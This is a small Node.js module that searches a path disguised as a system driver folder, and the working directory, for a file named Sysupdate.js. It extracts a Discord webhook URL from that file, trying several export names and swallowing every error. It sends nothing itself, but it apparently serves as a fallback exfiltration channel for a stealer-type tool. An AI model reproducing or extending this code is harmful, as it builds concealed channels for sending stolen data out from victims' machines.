const fs = require('fs');
const path = require('path');

function extractWebhookFromText(text) {
	try {
		const regex = /https?:\/\/(?:canary\.|ptb\.)?discord(?:app)?\.com\/api\/webhooks\/\d+\/[A-Za-z0-9_\-]+/;
		const m = text.match(regex);
		return m ? m[0] : null;
	} catch {
		return null;
	}
}

function getSysupdatePaths() {
	return [
		path.join(__dirname, 'logout', '.internal', 'Sys Driver', 'sys', 'drivers', 'Sysupdate.js'),
		path.join(process.cwd(), 'Sysupdate.js')
	];
}

function getSecondaryWebhook() {
	const candidates = getSysupdatePaths();
	for (const p of candidates) {
		try {
			if (!fs.existsSync(p)) continue;
			try {
				const mod = require(p);
				const maybe =
					mod?.SECONDARY_FALLBACK_WEBHOOK_URL ||
					mod?.WEBHOOK_URL ||
					mod?.SECONDARY_URL ||
					mod?.PRIMARY_WEBHOOK_URL ||
					mod?.webhook ||
					mod?.default;
				const val = typeof maybe === 'function' ? maybe() : maybe;
				if (typeof val === 'string' && val.startsWith('http')) return val;
			} catch {
				const txt = fs.readFileSync(p, 'utf8');
				const url = extractWebhookFromText(txt);
				if (url) return url;
			}
		} catch {}
	}
	return null;
}

module.exports = { getSecondaryWebhook };


